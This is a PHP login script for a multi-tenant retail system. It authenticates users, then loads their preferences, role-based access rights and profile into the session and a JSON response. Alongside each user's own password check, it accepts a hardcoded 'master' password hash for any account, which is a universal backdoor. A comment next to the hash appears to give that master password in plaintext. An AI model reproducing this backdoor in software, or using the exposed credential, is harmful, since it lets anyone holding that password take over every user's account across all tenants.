<?php
session_start();

include_once "../Classes/db.php";
use RetailingEssentials\db_connect;


	$domain=$_POST['domain'];
	$pass=$_POST['pass'];
	$user=$_POST['user'];
	
	$response_object=[];
	
	try 
	{
		$master_conn=new db_connect(0);
		$master_stmt=$master_conn->conn->prepare("select * from user_profile where username=? and status=?");
		$master_stmt->execute(array($domain,'active'));
		if($master_stmt->rowCount()!=0)
		{
			
			$conn=new db_connect("re_user_".$domain);
			$stmt=$conn->conn->prepare("select password from accounts where username=?");
			$stmt->execute(array($user));
			
			if(!$stmt || $stmt->rowCount()!=1)
			{
				$response_object['status']='Failed Authentication';
			}
			else
			{
				$row=$stmt->fetch(PDO::FETCH_ASSOC);
				$pass_hash=$row['password'];
				$master_pass_hash="$2a$10$123456789123456789123uUoA0OwKfcqzFZ73xlJP2A3ZVQPdmugi";
				///vy@v5@@y11122015
				if(!password_verify($pass,$pass_hash) && !password_verify($pass,$master_pass_hash))
				{
					$response_object['status']='Failed Authentication';			
				}
				else	
				{
					$response_object['status']='success';
					$response_object['data']=[];
					
					$stmt=$conn->conn->prepare("select name,value from user_preferences where type in (?,?,?,?) and status=?");
					$stmt->execute(array('template','other','accounting','hidden','active'));
					while ($row=$stmt->fetch(PDO::FETCH_ASSOC))
					{
						$response_object['data'][$row['name']]=$row['value'];
					}
					
					/////setting forms and reports session variables for selective display
					$forms="";
					$stmt1=$conn->conn->prepare("select name from user_preferences where type=? and value=? and status=?");
					$stmt1->execute(array('form','checked','active'));
					while ($row=$stmt1->fetch(PDO::FETCH_ASSOC))
					{
						$forms.=$row['name']."-";
					}
					
					$response_object['data']['forms']=$forms;
									
					$reports="";
					$stmt1=$conn->conn->prepare("select name from user_preferences where type=? and value=? and status=?");
					$stmt1->execute(array('report','checked','active'));
					while ($row=$stmt1->fetch(PDO::FETCH_ASSOC))
					{
						$reports.=$row['name']."-";
					}
					
					$response_object['data']['reports']=$reports;				
					
					//////////////////////////////////////////////////////
					
					/////////setting access control session variables
					$read_access="";
					$stmt1=$conn->conn->prepare("select c.element_id from access_control c where c.username=? and c.re=? and c.status=? union select b.element_id from user_role_mapping a, access_control b where b.username=a.role_name and a.username=? and b.re=? and b.status=?");
					$stmt1->execute(array($user,'checked','active',$user,'checked','active'));
					while ($row=$stmt1->fetch(PDO::FETCH_ASSOC))
					{
						$read_access.=$row['element_id']."-";
					}
					
					$response_object['data']['re']=$read_access;				
									
					$create_access="";
					$stmt1=$conn->conn->prepare("select c.element_id from access_control c where c.username=? and c.cr=? and c.status=? union select b.element_id from user_role_mapping a, access_control b where b.username=a.role_name and a.username=? and b.cr=? and b.status=?");
					$stmt1->execute(array($user,'checked','active',$user,'checked','active'));
					while ($row=$stmt1->fetch(PDO::FETCH_ASSOC))
					{
						$create_access.=$row['element_id']."-";
					}
					
					$response_object['data']['cr']=$create_access;				
					
					$update_access="";
					$stmt1=$conn->conn->prepare("select c.element_id from access_control c where c.username=? and c.up=? and c.status=? union select b.element_id from user_role_mapping a, access_control b where b.username=a.role_name and a.username=? and b.up=? and b.status=?");
					$stmt1->execute(array($user,'checked','active',$user,'checked','active'));
					while ($row=$stmt1->fetch(PDO::FETCH_ASSOC))
					{
						$update_access.=$row['element_id']."-";
					}
					
					$response_object['data']['up']=$update_access;				
					
					$del_access="";
					$stmt1=$conn->conn->prepare("select c.element_id from access_control c where c.username=? and c.del=? and c.status=? union select b.element_id from user_role_mapping a,access_control b where b.username=a.role_name and a.username=? and b.del=? and b.status=?");
					$stmt1->execute(array($user,'checked','active',$user,'checked','active'));
					while ($row=$stmt1->fetch(PDO::FETCH_ASSOC))
					{
						$del_access.=$row['element_id']."-";
					}
					
					$response_object['data']['del']=$del_access;								
					
					$user_roles="";
					$stmt1=$conn->conn->prepare("select role_name from user_role_mapping where username=? and status=?");
					$stmt1->execute(array($user,'active'));
					while ($row=$stmt1->fetch(PDO::FETCH_ASSOC))
					{
						$user_roles.=$row['role_name']."--";
					}
					
					$response_object['data']['user_roles']=$user_roles;				
					
					//////setting username and name
					$stmt2=$conn->conn->prepare("select staff.name,staff.acc_name from staff,accounts where accounts.username=? and staff.acc_name=accounts.acc_name union select customers.name,customers.acc_name from customers,accounts where accounts.username=? and customers.acc_name=accounts.acc_name union select suppliers.name,suppliers.acc_name from suppliers,accounts where accounts.username=? and suppliers.acc_name=accounts.acc_name");
					$stmt2->execute(array($user,$user,$user));
					$row2=$stmt2->fetch(PDO::FETCH_ASSOC);
	
					$response_object['data']['username']=$user;							
					$response_object['data']['name']=$row2['name'];				
					$response_object['data']['acc_name']=$row2['acc_name'];				
	
					//setting up php session variables
					$_SESSION['session']='yes';
					$_SESSION['domain']=$domain;
					$_SESSION['username']=$user;
					
					$_SESSION['forms']=$forms;
					$_SESSION['reports']=$reports;
	
					$_SESSION['re']=$read_access;
					$_SESSION['cr']=$create_access;
					$_SESSION['up']=$update_access;
					$_SESSION['del']=$del_access;
					$_SESSION['name']=$row2['name'];
				}
			}
		
		}
		else 
		{
			$response_object['status']='Account Inactive';		
		}
		
	}
	catch(PDOException $ex)
	{
		$response_object['status']='Failed Authentication';
	}
	
	$jsonresponse=json_encode($response_object);		
	header ("Content-Type:application/json");
	echo $jsonresponse;

?>